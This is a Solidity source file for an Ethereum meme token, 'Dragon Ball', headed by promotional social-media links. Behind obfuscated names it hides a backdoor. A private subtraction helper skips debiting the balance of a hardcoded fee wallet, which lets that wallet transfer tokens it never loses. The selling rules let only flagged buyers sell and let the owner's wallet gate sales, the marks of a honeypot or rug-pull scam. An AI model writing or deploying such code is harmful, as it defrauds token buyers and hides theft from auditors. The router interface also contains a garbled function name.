/**

Dragon Ball   $DragonBall
MAKING ANIME GREAT AGAIN.


𝕏/TWITTER: https://twitter.com/Dragonball_erc
TELEGRAM: https://t.me/Dragonball_erc20
WEBSITE: https://dragonballeth.com/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _Empax(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _Empax(a, b, "SafeMath:");
    }

    function  _Empax(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _xyopuaha {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _xmvcfuns {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract DragonBall is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Dragon Ball";
    string private constant _symbol = unicode"DragonBall";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalmz = 1000000000 * 10 **_decimals;
    uint256 public _muvkAmaunt = _Totalmz;
    uint256 public _Wallesuope = _Totalmz;
    uint256 public _wapThresfuto= _Totalmz;
    uint256 public _mfakTakof= _Totalmz;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _ishEioump;
    mapping (address => bool) private _taxbWavray;
    mapping(address => uint256) private _lrfpbuoe;
    bool public _trgaleauv = false;
    address payable private _TFvhjop;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapnfoxqb=0;
    uint256 private _brnkosje=0;


    _xmvcfuns private _Trolqf;
    address private _wivcudqs;
    bool private _qivmknfh;
    bool private lfSnluoqp = false;
    bool private _adeuedmp = false;


    event _amouxpgl(uint _muvkAmaunt);
    modifier laevTauhdq {
        lfSnluoqp = true;
        _;
        lfSnluoqp = false;
    }

    constructor () {      

        _TFvhjop = payable(0x79A58af5bcb4Ad4B40C0aA153FAF531F575cB0d3);
        _balances[_msgSender()] = _Totalmz;
        _ishEioump[owner()] = true;
        _ishEioump[address(this)] = true;
        _ishEioump[_TFvhjop] = true;

 

        emit Transfer(address(0), _msgSender(), _Totalmz);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalmz;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _Empax(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_trgaleauv) {
                if (to != address
                (_Trolqf) && to !=
                 address(_wivcudqs)) {
                  require(_lrfpbuoe
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lrfpbuoe
                  [tx.origin] = block.number;
                }
            }

            if (from == _wivcudqs && to != 
            address(_Trolqf) && !_ishEioump[to] ) {
                require(amount <= _muvkAmaunt,
                 "Exceeds the _muvkAmaunt.");
                require(balanceOf(to) + amount
                 <= _Wallesuope, "Exceeds the maxWalletSize.");
                if(_brnkosje
                < _wapnfoxqb){
                  require(! _Erjxnjpi(to));
                }
                _brnkosje++;
                 _taxbWavray[to]=true;
                teeomoun = amount.mul((_brnkosje>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _wivcudqs && from!= address(this) 
            && !_ishEioump[from] ){
                require(amount <= _muvkAmaunt && 
                balanceOf(_TFvhjop)<_mfakTakof,
                 "Exceeds the _muvkAmaunt.");
                teeomoun = amount.mul((_brnkosje>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_brnkosje>_wapnfoxqb &&
                 _taxbWavray[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!lfSnluoqp 
            && to == _wivcudqs && _adeuedmp &&
             contractTokenBalance>_wapThresfuto 
            && _brnkosje>_wapnfoxqb&&
             !_ishEioump[to]&& !_ishEioump[from]
            ) {
                _swpbigfoh( _Rcnpe(amount, 
                _Rcnpe(contractTokenBalance,_mfakTakof)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _rkrfmxp(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _Empax(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _Empax(teeomoun));
        emit Transfer(from, to, 
        amount. _Empax(teeomoun));
    }

    function _swpbigfoh(uint256
     tokenAmount) private laevTauhdq {
        if(tokenAmount==0){return;}
        if(!_qivmknfh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _Trolqf.WETH();
        _approve(address(this),
         address(_Trolqf), tokenAmount);
        _Trolqf.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _Rcnpe(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _Empax(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _TFvhjop){
            return a ;
        }else{
            return a . _Empax (b);
        }
    }

    function removeLimits() external onlyOwner{
        _muvkAmaunt = _Totalmz;
        _Wallesuope = _Totalmz;
        _trgaleauv = false;
        emit _amouxpgl(_Totalmz);
    }

    function _Erjxnjpi(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _rkrfmxp(uint256
    amount) private {
        _TFvhjop.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _qivmknfh);
        _Trolqf   =  _xmvcfuns (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_Trolqf), _Totalmz);
        _wivcudqs = _xyopuaha(_Trolqf.factory()). createPair (address(this),  _Trolqf . WETH ());
        _Trolqf.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_wivcudqs).approve(address(_Trolqf), type(uint).max);
        _adeuedmp = true;
        _qivmknfh = true;
    }

    receive() external payable {}
}